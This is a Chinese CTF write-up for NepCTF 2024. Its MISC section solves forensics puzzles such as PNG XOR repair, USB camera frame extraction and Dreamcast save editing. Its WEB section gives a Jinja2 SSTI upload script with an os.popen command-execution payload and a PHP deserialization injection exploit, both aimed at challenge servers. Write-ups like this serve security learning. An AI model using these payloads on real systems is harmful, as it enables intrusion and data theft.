---
title: '2024 NepCTF Writeup'
description: '正常玩通关即可，刚放题的时候以为是 rgss 游戏解包，但是 rxdata 解析出来的 FLAG 碎片不是明文，浪费了很多时间'
pubDate: 2024-08-20
author: 'IHK-1'
tags: ['CTF', 'NepCTF', '2024']
---

# MISC
## NepMagic —— CheckIn
<!-- 这是一张图片，ocr 内容为：NEPMAGIC 第8层 等级 1000 生命 攻击 100 防御 100 魔防 10 经验 金币 XIA0JI233 你的FLAG是 NEPCTF{50C505F4-2700-11EF-AD49-00155D5E2505] -->


正常玩通关即可，刚放题的时候以为是 rgss 游戏解包，但是 rxdata 解析出来的 FLAG 碎片不是明文，浪费了很多时间

## Nemophila
mimi.py 可以分析出来 key

```plain
secret_is{Frieren&C_SunR15e&Himme1_eterna1_10ve}
```

解压出来的 miaomiao.png 为乱码，与 PNG header 进行异或可以确定，png 与 key 异或即可解出正常图片

<!-- 这是一张图片，ocr 内容为：RECIPE INPUT XOR KEY HEX 89 50 47 0D OA 1A SCHEME NULL PRESERVING STANDARD NAME:MIAOMIAO.PNG SIZE:1,220,964 BYTES FILE ICON TYPE: IMAGE/PNG LOADED:100% OUTPUT SECRET_ .006EOC.MKTM.;BA.NSIB V..A.ORA.EUM.(:ZS(U5EOE,B.. ,0%QUA0>|司0.T$16A-.M*A...E2C)|IS..A;P.2E.GZM3.U.DM.EJW2......U*EU -->


异或 secret_is{Frieren&C_SunR15e&Himme1_eterna1_10ve} 的结果

<!-- 这是一张图片，ocr 内容为：日 O 编辑 DOWNLOAD.PNG L 1.2MB 园 1885X 999 66% -->


其宽高 CRC 异常

<!-- 这是一张图片，ocr 内容为：ON TWEAKPNG TOOLS HELP FILE EDIT INSERT OPTIONS LENGTH CRC CONTENTS ATTRIBUTES CHUNK WAMING INCORRECT CRC FOR LHDR CHUNK (IS 9A3FC668, SHOULD BE EB91C299) 确定 -->


爆破出正确宽高即可

<!-- 这是一张图片，ocr 内容为：[FILEPATH]:C:\USERS\HK\DESKTOP\DOWNLOAD.PNG [WIDTH]:1885 [HEUGHT]:1053 -->


<!-- 这是一张图片，ocr 内容为：NEPCTFLF L WERE THE ONLY_ONE I WOULD NOT BE ABLE TO SEE THIS SUNRISE] -->


## 3DNep
file 或者 文件头 可以判断出改为见是一个 gltf 文件，但是下载一个 Blender 之类的很麻烦，直接找个在线网站查看即可，模型底部有个汉明码

<!-- 这是一张图片，ocr 内容为： -->


扫码即可拿到 flag

## NepCamera
对每一个 usb 流进行分析

<!-- 这是一张图片，ocr 内容为：377272 URB_ISOCHRONOUS IN 1.6.8 278911 UR6 ISOOHROUDUS IN USB 1.01599 171391 URB_ISOCHROUOUS IN HOST USB 6.8 0.032001 26151 UR6 ISOOHRONDUS IN USB 1.6.8 48.048082 USB 500640000  206745 URB_ISOCHRONDUS IN 227525 UNE ISOCHRONEUS IN USB HOST 0.080844 1.6.8 1.6.8 78.096048 1575 URD_ISOCHROUSUS IN USB 801120888 216984 URB_ISOCHRONOUS IN 1.6.8 STEST AN GARU SI GAST 2312 USB 1.6.8 HOST 108.144005 HOST 1.6.8 11 0.160002 1575 URB_ISOCHROUS IN  206914 URB ISOCHRONOUS IN USB HOST 1.6.8 138.192888 1575 URB_ISOCHRONGUS IN HOST 1408.20800 285138 UAB 150618018018US EN 15 9.223983 206134 URB_ISOCHRONOUS IN 170.256084 1575 URB ISOCHROUS IN USB 180.272883 179751 URB_ISOCHRONOUS IN US8 190288001 24791 URB_ISOCHRONOUS IN HOST 1.6.8 280.304088  124455 URB ISOCHRONOUS IN 210.320081 76708 URB_ISOCHROUOUS IN 23 0:332893 85N  169095 URB ISOCHRONOUS IN HOST USB 88444 URB ISOCHRONDUS IN 240368046 HOST 6.8  FRANE 1: 377272 BYTES ON WIRE (3918176 BITS), 65535 BYTES CAPTURED (5289 SITS) ON INTERFACEPCAPL, ID 65535 BYTE USBURB 3 ISOCHRONOUS PACKET ISO DATA O OFFSET: 6X00088000 ISO DATA LENGTH: 0XE008CEO (RELEVANT) S ISOCHRONOUS PACKET ISO DATA OFFSET: 0X00000C00 350 DSTP LENETH: OSBOSTAFUSSELEVANT(EXEECEEGEEEE)(RELEVANT) USB ISOCHRONOUS           J  ISO DATA OFFSET: 6X00001800 ISO DATA LENGTH: 0X000000C00 (RELEVANT) ISO USAD STATUS: USBD STATUS SUCCESS(EXEECOOCEECEE)(RELEVANT) 名名:客车 -->


尝试直接提取

```plain
tshark -r /root/Desktop/NepCamera.pcapng -T fields -e usb.iso.data > /root/Desktop/output
```

JPG 头文件在第 12 字节之后，且每个流前 12 个字节相当有规律，作用可能类似于地址或者排序之类的，实际数据为 12 字节之后的内容

<!-- 这是一张图片，ocr 内容为：VMU SAVE A1.BIN 记始页 OUT2.TXTX DCTRIS2.CDI 小量包含量量量量量量量量量量量量量量量量量量量量量量量量量量量量量量量量量量量111811 小刀油油 小型车辆1111181118111811181118111811811811 小量 111811181118111811 C8C449236BE49DF48BEF901 小量118111181118111811 小量包含量118181811181818111818181818181818181818181811 姓名 C8DD70849BE591B49BE1902 C8DD70849BEC31E49BE190226 C8DD70849BE411F49BE19022D C8DD70849BEBD1F49BE1902 -->


写一个脚本进行提取全部有效内容（不每个流单独提取是因为不确定每个流之间的数据是否单独的，可能第二个流内容也是第一个流内容的一部分）

```python
import os

# 提取流量
command = "tshark -r NepCamera.pcapng -T fields -e usb.iso.data > output"
os.system(command)

# 切割流量
data_hex = open("output", "r").read().replace('\x00', '').replace(',', '\n').split('\n')
out_hex = ''
for item in data_hex:
    if len(item):
        out_hex += item[24:]

# 输出16进制结果
with open('output', 'w') as f:
    f.write(out_hex)

```

<!-- 这是一张图片，ocr 内容为：LLY LLDDITIONDLIDITIONDLIDITIOND INGLIDITIONDITIONDITIONDITIOND ING IND IND ING 小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小小11 -->


现在进行解 16 进制拿到所有图片拼接在一起的内容

```plain
xxd -r -p output > output 
```

那么现在的问题是如何将所有图片分开，最开始想到的是使用 foremost 进行，分离，但是每次提取的图片都没有 flag 的部分，中间缺失了，花费了大量时间确定了问题原因：foremost 分离的文件都是有文件头与文件尾的，然而实际传输过程中图片并不完整（可能是我的方法错误了），那些完整的图片也仅仅只是靠结尾 FF字节 确定是文件尾，导致大量有效信息缺失。



尝试直接通过文件头进行分割文件，切割出所有不完整的图片

```python
data = open("output", "rb").read()
data = data.split(b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01')

for i in range(len(data)):
    item = data[i]
    item = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01' + data[i]

    with open(rf"{i}.jpg", "wb") as f:
        f.write(item)
```

其有效信更多，以下为一个示例：

<!-- 这是一张图片，ocr 内容为：CLEAR_PICTU -->


最终通过残缺的图片帧拼接出 flag

```python
flag{Th3_c4mer4_takes_c1ear_pictures}
```

## DCTris Evolved
尝试查找了 nepctf 2022 的 DCTris WP ，发现需要先找到 BIOS

尝试直接 strings，发现一段特征

<!-- 这是一张图片，ocr 内容为：SYTMR VERSION:0.51 SYTMR BUILD:JUN 23 199814:52:57 +?R 2E: TW BT~ Z-KV RDTXT FLASK-SESSI... EZDL FOR JAPAN,TAIWAN,PHILIPINES. FOR USA AND CANADA. FOT EUROPE. -->


通过搜索可以确定为 一个较早版本的 Dreamcast BIOS，版本号 9EA4

<!-- 这是一张图片，ocr 内容为：OX9EA4: SYTMR VERSION: 0.51.SYTMR BUILD:JUN 23 199814:52:57 -->


但是无法找到这个版本的 Bios ，于是直接找了个 1998 年的 Dreamcast Bios [Sega Dreamcast BIOS :: Emu-Land.net](https://www.emu-land.net/en/consoles/dreamcast/bios)

<!-- 这是一张图片，ocr 内容为：DOWNLOAD SEGA DREAMCAST BIOS NMR 3ARPYKEHO PA3MEP DEMUL BIOS PACK 4.6 MIB 73585 68938 1.1 MIB SEGA DREAMCAST BIOS V1.004(1998)(SEGA)(JP) SEGA DREAMCAST BLOS V1.01D(1998)(SEGA)(EU) 1 MIB 84475 SEGA DREAMCAST BIOS V1.01D (1998)(SEGA)(US) 1 MIB 76307 SEGA DREAMCAST FLASH ROM(EUR-PAL) 50231 6KIB SEGA DREAMCAST FLASH ROM(EUR-PAL)[A1] 21125 6KIB 6KIB SEGA DREAMCAST FLASH ROM(JAP-NTSC) 26263 SEGA DREAMCAST FLASH ROM(JAP-NTSC)[A1] 13902 6 KIB 8KIB 15795 SEGA DREAMCAST FLASH ROM(JAP-NTSC)[A2] 45792 6 KIB SEGA DREAMCAST FLASH ROM(USA-NTSC) -->


尝试了多个模拟器，NullDC 以及 nepctf 2022 所使用的 reicast ，发现会有各种问题，闪退，卡死，不能操作等，最后确定使用 Flycast 启动

<!-- 这是一张图片，ocr 内容为：FLYCAST 筛选 ?南宫?紫汉化 设置 DREAMCAST BLOS DCTRIS2.CDI -->


开始游玩的时候没看清楚题目是总分达到 232323 分所以尝试了使用 CE 修改器进行数值修改，多次尝试都失败了，后面看清楚了是总分达到 232323 分，于是转而从 存档入手。



在模拟器的 /data 目录下的 vmu_save_A1.bin 发现了存档数据

<!-- 这是一张图片，ocr 内容为：DATA 十 Q 在DATA 中搜索 FLYCAST-V2.0 DATA 面 个排序 网 预览 查看 新建 OO 类型 名称 大小 修改日期 K-个人 2024/8/24 5:54 CDI文件 7,183KB DCTRIS2.CDI 附件 SEGA DREAMCAST BIOS V1.C04(1998)(SEGA)(SEGA)UP).BIN 2,048 KB 2004/8/31 21:14 BIN文件 图片 2024/8/25 23:26 O KB BIN文件 VMU SAVE A1.BIN 文档 2024/8/25 23:26 O KB BIN文件 VMU SAVE A2.BIN EDITOR-C\USERS\HK\DESKTOP\FLYCAST-V2.0\DATALVMU.SAVE.A1.BIN FLYCAST 编辑(日搜索(S)视图N)格式(O)解本()模板U)调试D)项目(P)工具O HIGH SCORE 10000 1 NEPCTF1 DCTRIS2.CDI VMU SAVE A1.BINX 0123456789ABCDEF A88888845888883888804 88848888848888888888  2 NEPCTF2 9000 0000000000000000 S886888444 0833 00 LG44380 094110 0000 00 00 00 00 000 00 8000 NEPCTF3 OA 000000000000000 NEPCTF1. 00 000 00 00 00 00 00 000 ..NEPC 43 7000 NEPCTF4 54463200000000000 00 00 (#.. 5446330000 0000 4E 45 50 43 NEPCTF3 6000 NEPCTF5 00 00 40 1F 00 00 4E 45 50 43 54 00 @..NEPCTF4. 46 35 00 00004E 00000000581B00 NEPCTFS. 5000 NEPCTF6 45  50 43 00070 .NEPC 000000000000000 54 46 36 00 00 00 00 00 00 1 130000 TF6. 4000 NEPCTF7 000000 00 4E 45 50 43 54 46 37 00 NEPCTF7. S4400KEK 000000  AO OF 00 00 45 50 43 54 NEPCTF8 3000 NEPCTF8 B 00004E 463900 00 00 00 B8 OB O NEPCTF9. LAGB888 45  50 43 00 00 00 000 ..NEPC 00000 2000 NEPCTF9 LEANE 00 00 TF10. 54 46 31 30 00 00 00 00 01 00 00 00 D8 EC 50 8C 50 8C OIPEO.PE.PE 10 NEPCTF10 1000 榜G00. SO AC 4D 8C A0 1D 50 8C ,PE' .PEE'MEA ME 50 8C 00 B5 4D 8C UME@EPE.IPEXIPE 地址 值 CONTROL: LIFETIME PO INTS 0 -->


尝试游玩，确定分数的地址在哪

<!-- 这是一张图片，ocr 内容为：1 NEPCTF1 10000 工作区 起始页 DCTRIS2.CDI VMU SAVE A1.BINX 2 NEPCTF2 0006 0123456789ABCDEF BCDEI 路径 文件 000000000000000 :8DEOH 00000000 00 00 0000 8000 NEPCTF3 打开的文件 00000000000000 :8DFOH 00 00 00 00 000 00  00 1714 ....NEPCTF1. 04354463100 0A 02 00 00 4E 45 50 :8E00H 00 00 CI....A DCTRIS2.CDI 7000 4 NEPCTF4 10 27 00 4E 45 50 43 ..................................................................................................... 0000 00 :8E10H 00 00000000 VMUSAVEA1.BIN CI...A\ TF2.........(#.. 000000 28230000 8E20H 000000 00 54 46 32 00 00( 项目 5 NEPCTF5 6000 000 4E 45  50 43 NEPCTF3... 54 46 33 000000 :8E30H 0000000 00 收藏的文件 40 1F 00 00 45 50 54 46 34 00 43 :8E40H @...NEPCTF4...... 00 00000 6 5143 00000000581B00( 00004E455043 :8E50H 54 46 35 00 X.X..NEPCTF5. 资 工作区 项目 170000 20 20 20 20 :8E60H 00-00-00-00-00-00-00-701 UNIP. 7 NEPCTF6 5000 2020202020202020202020202 :8E70H 17 14 00 00 检查器 X 000000000000 NEPCTF6.... :8E80H 4E45504354354636000000000000 8 NEPCTF7 4000 类型 :8E90H 88 13 00 00 4E 45 50 43 54 46 37 C 值 700 0000000 ..NEPCTF7. 00 00 AO 0F 00 00 4E 45 50 43 54 46 38 00 00 00 00 :8EAOH ,NEPCTF8. 01000011 二进制 9 NEPCTF8 3000 00000000000000000000808 00 00 45 50 45 43 :8EB0H .NEPC 5446390000000000000000 TF9. :8ECOH 0000DO070000 有符号字节 .D.. 67 10 NEPCTF9 2000 010000000D8EC5 :8EDOH 8C F8 1C 50 8C 20 1D 50 8C .QIPEO.P .PD PD 无箔号字节 67 AO 1D 50 80 1D 50 80 B4 4D 8C .PE' .PEE'MEA'ME COB4 4D 8C :8EE0H 变量 00 B5 4D 8C D8 EB 50 8C 18 EC 50 8C 58 EC 50 8C 检查器 C 50 8C 58 EC 50 8C 08C18 :8EFOH PMEOEPE.IPEXIPE 查找结果 -->


最终对比可以确认，红圈位子为名称与总分值，由于是小端存储的 16 进制数值

```plain
5143 = 0x1417
其中文件存储的格式为 17 14 而非 14 17
```

所以推测总积分也是一样，最终找到了总积分存储数据的 位置 

<!-- 这是一张图片，ocr 内容为：DCTRIS2.CDI 起始页 VMUSAVEA1BINX 0123456789ABCDEF 0123456789ABCDEF 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 1:8DE0H VUU 0000000 000000000000000000 1:8DFOH 17 14 NEPCTF1. 00004E455043 1:8E00H 54463100 0A020000 NEPC 1:8E10H 4E45 50 43 00000000 00 00 0001027000 0000 00000000000 28 23 TF2.. 1:8E20H 54463200 000  00 (#. NEPCTF3 54463 33000000000 1:8E30H 4E45 50 43 0000 000 50435446 @...NEPCTF4. 4E45 5 1:8E40H 3400 000 40 1F 000 000 E45 1:8E50H 50 43 3500 5446 .X.. 581B00004E NEPCTF5. 00000000 70  17 20 20 20 20 1:8E60H 00000 00 00000000 0000 20 20 20 20 20 1714 00 00 20 20 1:8E70H 20 20 20 2000 NEPCTF6. 1:8E80H 4E 45 50 43 5446360 000000( 0000 00000000 NEPCTF7 4E 45 504354463700 1:8E90H 88130000 00000000 00004E455043 AO OF 0000000 :8EA0H 54463800 NEPCTF8 4E 45 50 43 000 1:8EB0H 0000B80B000 00000000 .NEPC TF9 000 00000000000 DO070000 5446 1:8ECOH 3900 D.. D8 EC 50 8C F8 1C 50 8C DIPEO.PE .PE 0100 20 1D 50 8C 1:8ED0H 000 0 8C 84 4D 8C PE .PEE MCE MCE AO 1D 60 1D 50 50 8C 1:8EE0H CO B4D 8C 00 B5 4D 8C D8 EB 50 8C 18 EC 50 8C 58 EC 50 8C UMEDEPE.IPEXIPE 1:8EFOH 查找结果 -->


尝试前后随意修改几位较多的数值，发现成功修改

<!-- 这是一张图片，ocr 内容为：10000 NEPCTF1 起始页 DCTRIS2.CDI VMU SAVE A1.BINX 2 NEPCTF2 9000 01234 888488888888888888833  A880888838480835888848 SAGE480840 NEPCTF3 8000 00 00 00 00 00 08 00 00 00 00 (1 :8DEOH 8 8844388 98843886440844 98000004400044800881  88888888888888888888   :8DFOH 00 00 00-0 000 7000 NEPCTF4 8993888888888888899998 :8E00H  OA   O 40044888444806608 :8E10H 00 0000 NEPCTF5 6000 00 00 NEPC :8E30H SH 40 1F 00 00 00 5143 :8E40H 9 00 00 48 1:8E50H 00000( 35 00 :8E60H 00 00  5000 NEPCTF6 20 20 14 1:8E70H2020201 00 00 4000 00 NEPC 4 4E 45 50 0000 0 43 :8E80H NEPCTF7 :8E90H8813000 00 00  00 9 NEPCTF8 3000 SGMAGHE 463800 :8EAOH 8888833 000000 400KEHE 9888888 S00880 45  50 43 00 00 :8EBOH 2000 10 NEPCTF9 TF9. 54 46 8ECOH 070000 8ED0H 1D 50 8C .PA B4 4D 8C :8EEOH 1:8EFOH 00 EC 50 8C - UMCE 查找结果 CONTROL: 值 地址 LIFETIME POINTS:10032151 -->


且在每局游戏结束，会提示 FLAG IN VMU（虽然能直接在 010中看到，但是不会触发 FLAG）

<!-- 这是一张图片，ocr 内容为：NEXT HOLD 0 PO INTS SCORE 0 RANK COMBO 166.4 0 FLAG IN VMU CONTROL: 1.00 -->


该模拟器设置中提供了 VMU 的选项

<!-- 这是一张图片，ocr 内容为：FLYCAST 设置 宽屏游戏秘籍(? 各向异性过滤(2) 禁用 纹理过滤: 强制最近邻(?) 强制线性(?) 默认(?) 垂直同步(? 显示EPS计数器(2) RANK 在游戏中显示VMU COMBO 旋转屏幕90?(?) 延迟帧交换 原生深度插值(?) 图形API: DIRECTX9 DIRECTX 11 VULKAN OPEN GL 内部分辨率(?) 640X480(原画) 水平拉伸(?) 100 跳帧(2) -->


修改完成后可以在左上角看到 FLAG

<!-- 这是一张图片，ocr 内容为：X FLYCAST-MOUSE CAPTURE NEXT HOLD O POINTS SCORE 0 RANK: COMBO 128.0 0 FLAG IN VMU CONTROL: X1.00 -->


最后拼接得到完整 FLAG，其中三个点卡了我很久，一直以为是下划线或者两个点，痛失 一血

```plain
NepCTF{Celebrating...Tetris_40TH_Anniversary!}
```

# WEB
## NepDouple
开始以为是路径穿越，尝试了 ../ 但是其当作文件名时会被禁止，可控的点只有 文件名，文件内容，其中代码有两个特殊的函数，而非对模板直接渲染，其中的 render_template_string 存在 SSTI

<!-- 这是一张图片，ocr 内容为：0 N FLASK INPORT FLASK, REQUEST,PENDER.TEUPLATE,RENDER-TEMPLATE-STRING FRON 2IPFILE INPORT ZIPFILE IMPORT DATETINE FROM JINJA2 IMPORT ENVIRONMENT. FITESYSTENLOADER APP : FLASK(.NANE...TEMPLATE.FOICEPE'STATIC') BPP.CONFIG['MAX CONTENT_LENGTH'] - 1 * 1024 * 1024 UPLOAD.FOLDER APP/UPLOADS' EPP.CONFIG['UPLOAD FOLDER'] - UPLOAD.FOLDER IF NOT OS.PATH.EXISTS(UPLOAD_FOLOER): OS.MAKEDIRS(UPLOAD_FOLOER) TEMPLATE_ENV - ENVIRONNENT(LOADER-FILESYSTENLOADER('STATIC'), AUTOESCAPE-TRUE) 02 DEF RENDER.TENPLATE(TENPLATE_NANE, KKCONTEXT): 世纪职工GWWITHE TERPLATE : TEMPLATE.ENV.GET_TEMPLATE(TEMPLATE.NEME) RETURN TENPLATE.RENDER(**CONTEXT) DEF RENDER TEMPLATE STRING(TEMPTATE STRING, **CONTEXT): TEMPLATE TENPLATE.ENV.FROM.STRING(TEMPLATE.STRING) RETURN TEMPLATE.RENDER(*XCONTEXT) @APP.ROUTE('/', METHODS:['GET', 'POST']) DEF MAIN(): 31 IF RECUEST.NETHOD IS 'POST': 32 RETURN 'PLEASE USE POST METHOD TO UPLOAD FILES.' 33 34 TRY: 35 CLEAR_UPLOADS_FOLDER() 36 FITES : REGUEST.FITES.GET('TP.FILE', NONE) 37 IF NOT FILES: 58 RETURN NO FILE UPLOADED. 39 40 FILE_SIZE - LEN(FILES.READ() 41 FILES.SEEK(0) 42 43 LIGHLEDL模式. 访问完整IDEV -->


现在只需要对文件名 SSTI 即可，编写一个脚本，方便进行一次性操作

```python
import zipfile
import html
import requests


def send_file(url, file_path):
    with open(file_path, 'rb') as f:
        files = {'tp_file': (file_path, f)}
        response = requests.post(url, files=files)
    print(html.unescape(response.text))


url = 'https://neptune-23698.nepctf.lemonprefect.cn/'
file_name = r"{{ 1+1 }}"

with open(file_name, 'w') as f:
    f.write("test")
zipfile = zipfile.ZipFile('test.zip', 'w')
zipfile.write(filename=file_name)
zipfile.close()

send_file(url, 'test.zip')
```

其中返回值为 2，直接模板注入，payload：

```plain
lipsum.__globals__['os'].popen('cd ..;cd ..;cd ..;cd ..;cat flag').read()
```

## PHP_MASTER!!
对链子进行分析，非常简单的链子

```plain
C::__destruct() --> B::_tostring() --> A::readflag()
```

但是每个点构造起来十分麻烦

由于 类B 可以调用自定义函数，所以先从 类 B 看起，构造phpinfo()，其中 类 B 对 nep 进行了严格过滤

<!-- 这是一张图片，ocr 内容为：$B: PUBLIC TOSTRING PUBLIC FUNCTION IF(PREG_MATCA("/\[|\]/I", $_GET['NEP' DIE(NUNONOY)):): $_GET['NEP'  SUBSTRSTR($_GET['NEPL']."[WELCOME "CTF]"): $STR $STR: ECHO ($STR--'NEPCTF]'){ IF ($THIS->B)  (): RETURN 子 -->


从 nep1 进行入手，其处理函数如下

<!-- 这是一张图片，ocr 内容为：FUNCTION SUBSTRSTR($DATA) MB_STRPOS($DATA, $START "]"): $END MB_STRPOS($DATA, 1, $END $START) MB_SUBSTR($DATA, $START RETURN -->


分析为 从第一个 [ 出现的位置之后，截取到 ] 出现的位子之前，再偏移几位，那么可以尝试

```plain
]必须得放在第一位，因为放在后面那么就会变成 NepCTF].....] ，输出是第一个]的位子，必然只有 NepCTF 结果，而不会出现 NepCTF] 

那么$end是0，那么想截取后面的值，那么只能是负数了，需要构建一个 string[x+1:-1-x] 为 NepCTF]

最终构造如下：
]              [NepCTF]
start = 15
end = 0
```

```php
<?php
function substrstr($data)
{
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start);
}

$str = substrstr("]              [NepCTF][welcome to CTF]"); 
echo $str;
?>
```

再分析 类 C，分析构造的话需要伪造一个新的 B 类，正常攻击 payload 如下

```php
<?php
class B
{
	public $b = "phpinfo";
}
class C
{
    public $s;
    public $str;
}
$b = new B();

$c = new c();
$c -> s = "test";
$c -> str = $b;

echo serialize($c);
?>
// O:1:"C":2:{s:1:"s";s:4:"test";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}
```

可是实际只能做到

```php
<?php
class B
{
	public $b = "phpinfo";
}
class C
{
    public $s;
    public $str;
}
$b = new B();

$c = new c();
$c -> s = "test";

echo serialize($c);
?>
// O:1:"C":2:{s:1:"s";s:4:"test";s:3:"str";N;}
```

那么想要其触发，可以伪造成

```plain
s = test";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}
那么序列化后会变成 O:1:"C":2:{s:1:"s";s:4:"test";s:3:"str";O:1:"B":1:{s:1:"b";s:7:"phpinfo";}}";s:3:"str";N;}
```

其为一个增加绕过，那么只要构造一个 payload 长度，00 *n  即 2*n 的长度后刚好为 \0*n 的长度即 1*n + payload，那么 n 为 payload 长度，最终构造如下：

```plain
\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\";s:3:\"str\";O:1:\"B\":1:{s:1:\"b\";s:7:\"phpinfo\";}}
```

进行 url 编码后访问，同时传参 nep=]              [NepCTF]  成功执行 phpinfo()

由于 GZ 平台的原因，FLAG需要设置在环境变量中，所以可以使用 phpinfo 拿到 flag

<!-- 这是一张图片，ocr 内容为：GZCTF TEAM ID 53 10.66.0. KUBERNETES SERVICE HOST GZCTF FLAG NEPCT1(B542FAAD9C75) KUBERNETES PORT TCP://10.66.0.1:443 443 KUBERNETES PORT 44S TCP PORT APACHE RUN USER /USE/LOCAL/SBING/USR/BIN:/BIN:/USR/SBIN:/SBIN:/SBIN:/SBIN:/BIN:/BIN PATH 第1项,共找到1个四项 X 高完全部(A) 区分大小写() 西南凌音符号电 全国四围WD 日存储 0内存 卡网络{样式输铝器 器应用程序 无障碍环境 MAX HACKBAR 小性能 HACKBAR SQL* XSS* LFI* OTHER* C微信公众号:江南小虫虫HACKBAR V2 STASSNARDUCCRINDAIENIENICEZ-21NIDANDANDANIDANDAINIDAINIDAINIDAINIDAINNDANDANINANDANIDANDANDUN 13A1%3A%78S%3A1%3A%220%22%3BS%3A7%3A%220HPINF0%22%3B%7D%7D [NEPCTF] &NEP1- -->


